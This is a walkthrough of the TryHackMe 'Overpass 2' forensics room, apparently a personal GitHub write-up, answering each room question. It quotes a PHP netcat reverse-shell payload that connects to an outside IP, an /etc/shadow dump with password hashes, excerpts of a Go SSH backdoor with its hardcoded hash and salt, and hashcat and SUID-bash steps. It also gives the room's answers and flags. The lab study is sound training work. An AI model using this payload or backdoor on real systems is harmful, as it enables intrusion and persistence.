

![image](https://github.com/user-attachments/assets/56181f76-e131-4cd7-9986-6523c7062a51)


![image](https://github.com/user-attachments/assets/7cb4b346-c93f-4c87-a04e-89f4f615bbe6)





<h2>Task 1. Forencics - Analyse the PCAP</h2>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>What was the URL of the page they used to upload a reverse shell?</em><br><a id='1.1'></a>
>> <code><strong>/development/</strong></code>


<br>

![image](https://github.com/user-attachments/assets/65b16fd5-d17f-4045-b9eb-ce90853d922c)


<br>

> 1.2. <em>What payload did the attacker use to gain access?</em><br><a id='1.2'></a>
>> <code><strong><?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?></strong></code>

<br>

![image](https://github.com/user-attachments/assets/60fbc4b9-9521-4ded-81f9-2a4a44489c9a)

<br>

![image](https://github.com/user-attachments/assets/124fa995-0d09-4317-90af-8b3b137de3ab)

<br>

> 1.3. <em>What password did the attacker use to privesc?</em><br><a id='1.3'></a>
>> <code><strong>whenevernoteartinstant</strong></code>


<br>

<p>In previous question, we learned that happended a connection to 192.168.170.145 on port 4242<./p>

<br>

![image](https://github.com/user-attachments/assets/e3a9bd48-6cef-4290-8764-058d9e5e0f35)

<br>

![image](https://github.com/user-attachments/assets/de5baa8c-6804-4370-acff-9e0f6e4b1e27)

<br>

> 1.4. <em>How did the attacker establish persistence?</em><br><a id='1.4'></a>
>> <code><strong>https://github.com/NinjaJc01/ssh-backdoor</strong></code>

<br>

![image](https://github.com/user-attachments/assets/dcd4553c-6b72-4cb4-bc8c-8606e3fe454d)


<br>

> 1.5. <em>Using the fasttrack wordlist, how many of the system passwords were crackable?</em><br><a id='1.4'></a>
>> <code><strong>4</strong></code>

<br>

![image](https://github.com/user-attachments/assets/dfd9fdd4-273b-4135-ac88-43a504d8fa0e)

![image](https://github.com/user-attachments/assets/e29c9c86-2785-498c-8c66-c240e103e790)

<pre><code>sudo cat /etc/shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::</code></pre>

<br>

![image](https://github.com/user-attachments/assets/49a38468-7ae4-42f1-867e-996397621099)


<br>


<p>I downloaded the pcap file.</p>

<br>

<p>Opened pcap file in Wireshark.</p>

<br>

![image](https://github.com/user-attachments/assets/7e41c93c-b32e-4d34-a8b9-a1a29bff38dc)

<br>

![image](https://github.com/user-attachments/assets/1d88c764-62ec-4386-bf78-dd48d99378e0)


<br>
<h2>Task 2. Research - Analyse the code</h2>

<p>Now that you've found the code for the backdoor, it's time to analyse it.</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 2.1. <em>What's the default hash for the backdoor?</em><br><a id='2.1'></a>
>> <code><strong>bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</strong></code>


<br>

![image](https://github.com/user-attachments/assets/a9ec3588-6c2b-4116-bec3-7eb2fc97a45f)

<br>

<pre><code>└─$ cat main.go         
package main

import (
        "crypto/sha512"
        "fmt"
        "io"
        "io/ioutil"
        "log"
        "net"
        "os/exec"

        "github.com/creack/pty"
        "github.com/gliderlabs/ssh"
        "github.com/integrii/flaggy"
        gossh "golang.org/x/crypto/ssh"
        "golang.org/x/crypto/ssh/terminal"
)

var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"

func main() {
        var (
                lport       uint   = 2222
                lhost       net.IP = net.ParseIP("0.0.0.0")
                keyPath     string = "id_rsa"
                fingerprint string = "OpenSSH_8.2p1 Debian-4"
        )

        flaggy.UInt(&lport, "p", "port", "Local port to listen for SSH on")
        flaggy.IP(&lhost, "i", "interface", "IP address for the interface to listen on")
        flaggy.String(&keyPath, "k", "key", "Path to private key for SSH server")
        flaggy.String(&fingerprint, "f", "fingerprint", "SSH Fingerprint, excluding the SSH-2.0- prefix")
        flaggy.String(&hash, "a", "hash", "Hash for backdoor")
        flaggy.Parse()

        log.SetPrefix("SSH - ")
        privKeyBytes, err := ioutil.ReadFile(keyPath)
        if err != nil {
                log.Panicln("Error reading privkey:\t", err.Error())
        }
        privateKey, err := gossh.ParsePrivateKey(privKeyBytes)
        if err != nil {
                log.Panicln("Error parsing privkey:\t", err.Error())
        }
        server := &ssh.Server{
                Addr:            fmt.Sprintf("%s:%v", lhost.String(), lport),
                Handler:         sshterminal,
                Version:         fingerprint,
                PasswordHandler: passwordHandler,
...
</code></pre>

<br>


<br>

> 2.2. <em>What's the hardcoded salt for the backdoor?</em><br><a id='2.2'></a>
>> <code><strong>1c362db832f3f864c8c2fe05f2002a05</strong></code>


<br>

<pre><code>└─$ cat main.go         
package main

import (
        "crypto/sha512"
        "fmt"
 ...
               }
                go func() {
                        io.Copy(f, s) // stdin
                }()
                io.Copy(s, f) // stdout
                cmd.Wait()
        } else {
                io.WriteString(s, "No PTY requested.\n")
                s.Exit(1)
        }
}

func runCommand(cmd string) []byte {
        result := exec.Command("/bin/bash", "-c", cmd)
        response, _ := result.CombinedOutput()
        return response
}

func passwordHandler(_ ssh.Context, password string) bool {
        return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
        
</code></pre>

<br>


> 2.3. <em>What was the hash that the attacker used? - go back to the PCAP for this!</em><br><a id='2.3'></a>
>> <code><strong>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</strong></code>


<br>

![image](https://github.com/user-attachments/assets/b6d29e61-efa3-463c-9ac7-dd64bcfee7ac)

<br>

![image](https://github.com/user-attachments/assets/f2e907b2-897f-4dd1-975d-eb26a162c9e5)


<br>

> 2.4. <em>Crack the hash using rockyou and a cracking tool of your choice. What's the password?</em><br><a id='2.4'></a>
>> <code><strong>___</strong></code>

<br>

![image](https://github.com/user-attachments/assets/c93fbd08-7fc5-4f2f-a6d3-9ac1c5f0eb91)

<br>

<p>I used this: https://www.tunnelsup.com/hash-analyzer/</p>

<br>

![image](https://github.com/user-attachments/assets/a3b59301-bf7f-4762-a9ce-3f1bae9cff69)

<br>

<p>Let´s go to: https://hashcat.net/wiki/doku.php?id=example_hashes</p>

<br>

![image](https://github.com/user-attachments/assets/070dfb18-de57-421e-ba92-966aa12d62e9)

<br>

<pre><code>sha512($pass.$salt) </code></pre>

<br>

<pre><code>bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3:1c362db832f3f864c8c2fe05f2002a05</code></pre>

<br>

<pre><code>hashcat -m 1710 -a 0 -o hash.txt /home/kali/Downloads/rockyou.txt</code></pre>

<br>


![image](https://github.com/user-attachments/assets/0e3baae5-77b5-4f8d-ba7f-4ecf1fdb9899)

<br>

<p>november16</p>

<br>

<h2>Task 3. Attack - Get back in!</h2>
<p>Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.<br>

There's flags on the box that Overpass can't afford to lose by formatting the server!</p>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 3.1. <em>The attacker defaced the website. What message did they leave as a heading?</em><br><a id='2.1'></a>
>> <code><strong>H4ck3d by CooctusClan</strong></code>


<br>


<pre><code>~/Overpass2# nmap -A [Target]
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-12 21:03 GMT
Nmap scan report for [Target].eu-west-1.compute.internal ([Target])
Host is up (0.00046s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
...
MAC Address: 02:56:F4:0E:8C:19 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
...
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms [Target].eu-west-1.compute.internal ([Target])

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.47 seconds
</code></pre>

<br>

![image](https://github.com/user-attachments/assets/9194b486-5431-4255-8236-acd5fd3e4115)

<br>



<br>

> 3.2. <em>Using the information you've found previously, hack your way back in!</em><br><a id='3.2'></a>
>> <code><strong>No answer needed</strong></code>


<br>

<pre><code>ssh [Target IP] -p [Target Port]</code></pre>

<p>Let´s used the password we cracked in previous task.</p>

![image](https://github.com/user-attachments/assets/ee98472f-1a59-4c33-ac58-afa6d337b2ed)

<br>

> 3.3. <em>What's the user flag?</em><br><a id='3.3'></a>
>> <code><strong>thm{d119b4fa8c497ddb0525f7ad200e6567}</strong></code>

<br>

![image](https://github.com/user-attachments/assets/ca0c5ca1-fb1a-461e-a64e-f5993ca9a4f2)


<br>


> 3.4. <em>What's the root flag?</em><br><a id='3.3'></a>
>> <code><strong>No answer needed</strong></code>


<br>

![image](https://github.com/user-attachments/assets/fcc4ab75-ba8f-46d9-bdb5-7a47c1f916ef)

<br>

<pre><code>$ ./.suid_bash -p</code></pre>


![image](https://github.com/user-attachments/assets/ccaad47a-8895-4be5-81af-faa49ed2f87a)

<br>


<br>
<h2>Room Complete</h2>
<p>Keep learning, keep growing!</p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/0e0f0692-5a22-48c1-9cc2-e6d6d8fb04bb"></p>


<br>

<p align="center"> <img width="750px" src=""></p>


<br>

<br>


<h2>My Journey<a id='7'></a></h2>
<p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| December 12, 2024 | 220      |       940 th |        19 th |      392 nd |       2 nd | 61,356   |       468 |

</div>


<p align="center"> <img width="750px" src=""></p>

<br>

<p align="center"> <img width="750px" src=""></p>


<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>

